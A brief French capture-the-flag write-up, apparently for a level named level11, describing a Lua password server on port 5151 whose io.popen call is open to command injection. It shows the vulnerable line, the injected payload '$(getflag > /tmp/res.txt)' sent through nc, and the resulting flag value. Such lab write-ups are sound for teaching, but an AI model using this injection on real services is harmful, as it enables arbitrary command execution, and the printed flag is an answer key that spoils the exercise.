Dans ce niveau on a un fichier ```level11.lua```

En regardant ce qui se passe on voit qu'il requiere un mdp

On utilise ```nc 127.0.0.1 5151``` pour acceder au port ou ecoute le server cree par le script

Il existe une vulnerabilite dans le code ```prog = io.popen("echo "..pass.." | sha1sum", "r")```

On lui passe la commande ```$(getflag > /tmp/res.txt)```

Et avec ```cat /tmp/res.txt``` on obtient le flag ```fa6v5ateaw21peobuub8ipe6s```